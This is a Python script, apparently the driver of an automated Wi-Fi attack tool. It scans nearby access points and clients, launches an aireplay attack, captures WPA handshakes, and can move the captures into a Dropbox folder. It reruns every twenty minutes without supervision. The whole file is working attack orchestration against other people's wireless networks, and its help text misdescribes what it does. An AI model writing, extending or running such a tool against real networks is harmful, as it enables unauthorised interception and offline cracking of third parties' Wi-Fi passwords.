#!/usr/bin/python
"""
The product scans nearby network devices. After that, 
it tries to capture WPA Handshake belong to these network devices.
"""
# -*- coding: utf-8 -*-
import logging
import logging.config
from time import sleep
import sys
import traceback
import argparse
import os

from src.items import Items
from src.aircrack.airodump import Airodump
from src.aircrack.aireplay import Aireplay
import src.helpers as helpers

def run(configfile='conf.default.yaml', resume=None):
    try:
        settings = helpers.get_settings(configfile)

        items = Items()
        airo = Airodump(items, settings.tool.dump)
        #print airo.scan(path='dump', format='csv', interface='wlan1mon')
        amk = airo.discover_ap(
                timeout=settings.airodump.ap.timeout, 
                limit=settings.airodump.ap.limit,
                signal_=settings.airodump.ap.signal,
                encryption_=settings.airodump.ap.encryption,
                exception=settings.airodump.ap.exception,
                interface_=settings.tool.interface,
                resume=resume)
        logging.debug("\nDISCOVERED AP's: {}".format(amk))
        
        clients = airo.discover_client(
                    timeout=settings.airodump.client.timeout, 
                    limit=settings.airodump.client.limit,
                    signal_=settings.airodump.client.signal,
                    exception=settings.airodump.client.exception,
                    interface_=settings.tool.interface,
                    resume=resume)
        logging.debug("\nDISCOVERED CLIENT's: {}".format(clients))
        
        aire = Aireplay(items, settings.tool.dump)
        aire.attack()
        captured = airo.capture(
                    timeout=settings.airodump.capture.timeout,
                    interface_='wlan1mon')
        logging.debug("\nCAPTURED AP's: {}".format(captured))
        
        if captured:
            dropbox = None
            if hasattr(settings, 'dropbox'):
                dropbox = settings.dropbox

            helpers.move_capturefiles(
                captured, 
                settings.tool.capture, 
                dropbox)

        return True
    except:
        logging.error(traceback.format_exc())
        raise
    finally:
        airo.scan_stop()
        aire.attack_stop()
        
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(
        description='Check Dropbox folder and '
        'fetch some files if there are uploaded ones recently.')

        parser.add_argument('-d', '--debug', dest='debug', action='store_true',
                            help='debug mode, print console logs')

        parser.add_argument('-c', '--configfile', dest='configfile', 
                            action='store', default='conf.default.yaml', 
                            help='config file path')

        parser.add_argument('-r', '--resume', dest='resume',
                            action='store_true', 
                            help='resumes using latest dump files')

        args = parser.parse_args()

        try:
            logging.config.fileConfig('logging.ini')
        except:
            with open('error.log', 'a') as f:
                f.write(
                    "{}: {}\n".format(
                        helpers.get_date(), 
                        traceback.format_exc()))
            sys.exit(1)
        else:
            logging.debug("Logging has been set.")
        while True:
            run(configfile=args.configfile, resume=args.resume)
            sleep(1200)
    except:
        sys.exit(1)
    else:
        sys.exit(0)
